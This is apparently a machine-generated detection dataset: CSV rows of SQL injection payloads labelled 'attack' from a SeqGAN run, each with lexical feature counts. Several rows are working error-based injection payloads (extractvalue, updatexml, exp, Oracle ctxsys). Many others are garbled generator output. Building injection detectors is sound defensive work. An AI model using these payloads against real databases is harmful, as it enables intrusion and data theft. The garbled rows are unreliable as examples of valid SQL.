label,payload,family,payload_type,method,run_id,sample_index,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,keyword_total
attack,"1'   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  '""  =  ""' where 3547  =  3547 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161   )    )   ||'l""  =  ""q",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,10,395.0,38.0,3.6270972908175008,87.0,78.0,172.0,58.0,0.22025316455696203,0.19746835443037974,0.43544303797468353,0.1468354430379747,4.0,4.0,0.0,0.0,1.0,5.0,0.0,31.0,0.0,0.0,10.0,8.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,4.0,0.0,1.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,11.0
attack,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'eeypjyyoy'  =  'yy'  =  'ty'  =  'uz",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,11,215.0,30.0,3.5385014090516065,54.0,35.0,93.0,33.0,0.25116279069767444,0.16279069767441862,0.4325581395348837,0.15348837209302327,8.0,0.0,0.0,0.0,0.0,4.0,0.0,16.0,0.0,0.0,5.0,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1""  )   or where 2017(  =  =  =  =  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,12,36.0,14.0,2.8508453264074296,7.0,5.0,17.0,7.0,0.19444444444444445,0.1388888888888889,0.4722222222222222,0.19444444444444445,0.0,1.0,0.0,0.0,0.0,4.0,0.0,2.0,0.0,0.0,0.0,4.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,-7810e  )   or by by 9067  =  0x7171706a711045  1045,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,13,52.0,19.0,3.588280219645183,9.0,26.0,14.0,3.0,0.17307692307692307,0.5,0.2692307692307692,0.057692307692307696,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"-'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  '4822x""  =  ""uowy' like 'wz",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,14,254.0,36.0,3.8401675485855002,80.0,40.0,102.0,32.0,0.31496062992125984,0.15748031496062992,0.4015748031496063,0.12598425196850394,4.0,2.0,1.0,0.0,0.0,2.0,0.0,18.0,0.0,0.0,5.0,3.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,-7864or 1  utlyv,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,15,16.0,14.0,3.702819531114783,7.0,5.0,3.0,1.0,0.4375,0.3125,0.1875,0.0625,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1   )or 1 where 4386,6082  =    =  =  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,16,38.0,16.0,3.175430473912968,7.0,10.0,16.0,5.0,0.18421052631578946,0.2631578947368421,0.42105263157894735,0.13157894736842105,0.0,0.0,0.0,0.0,0.0,3.0,0.0,1.0,0.0,0.0,1.0,3.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,-7810or 3440  )tl_inuadn1045uad,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,17,31.0,20.0,4.17146526179041,13.0,12.0,3.0,3.0,0.41935483870967744,0.3870967741935484,0.0967741935483871,0.0967741935483871,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,1'||  (  select ',error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,18,17.0,10.0,3.0516016368717036,6.0,1.0,5.0,5.0,0.35294117647058826,0.058823529411764705,0.29411764705882354,0.29411764705882354,2.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"1""   )    )    )    )l 9067and where ,=  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,19,41.0,18.0,3.0053919583315656,9.0,5.0,20.0,7.0,0.21951219512195122,0.12195121951219512,0.4878048780487805,0.17073170731707318,0.0,1.0,0.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"1""   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   ""tu",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,20,220.0,30.0,3.688907817224287,71.0,37.0,88.0,24.0,0.32272727272727275,0.16818181818181818,0.4,0.10909090909090909,0.0,2.0,0.0,0.0,0.0,1.0,0.0,16.0,0.0,0.0,5.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1""   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   ""tu'  =  ''  =  ''  =  '' where 6765  =  6765 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'u'  =  'xtwxyu",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,21,423.0,34.0,3.819268286694515,116.0,83.0,165.0,59.0,0.27423167848699764,0.19621749408983452,0.3900709219858156,0.13947990543735225,10.0,2.0,0.0,0.0,0.0,7.0,0.0,27.0,0.0,0.0,11.0,9.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
attack,"-3775'',1392 1dhyuou",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,22,20.0,15.0,3.8219280948873626,6.0,9.0,1.0,4.0,0.3,0.45,0.05,0.2,2.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,1'  ))   or 1  =xoy,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,23,19.0,9.0,2.6689801450225326,5.0,2.0,8.0,4.0,0.2631578947368421,0.10526315789473684,0.42105263157894735,0.21052631578947367,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"1"",p1045otxu' from dual where 7368  =  7368 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'"" like ""'  =  'z",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,24,206.0,37.0,4.091061078315646,56.0,51.0,69.0,30.0,0.27184466019417475,0.24757281553398058,0.33495145631067963,0.14563106796116504,4.0,3.0,0.0,0.0,0.0,3.0,0.0,11.0,0.0,0.0,7.0,5.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,1'  )   or or by 2131c   (  8877t.c,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,25,35.0,16.0,3.333265764430747,9.0,9.0,13.0,4.0,0.2571428571428571,0.2571428571428571,0.37142857142857144,0.11428571428571428,1.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1""   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   ""oymu",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,26,222.0,31.0,3.734982667438595,73.0,37.0,88.0,24.0,0.32882882882882886,0.16666666666666666,0.3963963963963964,0.10810810810810811,0.0,2.0,0.0,0.0,0.0,1.0,0.0,16.0,0.0,0.0,5.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%' and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ' fx%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,27,346.0,35.0,3.5657922345213775,86.0,49.0,149.0,62.0,0.24855491329479767,0.1416184971098266,0.430635838150289,0.1791907514450867,2.0,2.0,0.0,0.0,0.0,3.0,0.0,30.0,2.0,0.0,1.0,23.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1""   ))   a m where where =  ctyx",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,28,33.0,15.0,3.2559229069750026,16.0,1.0,12.0,4.0,0.48484848484848486,0.030303030303030304,0.36363636363636365,0.12121212121212122,0.0,1.0,0.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
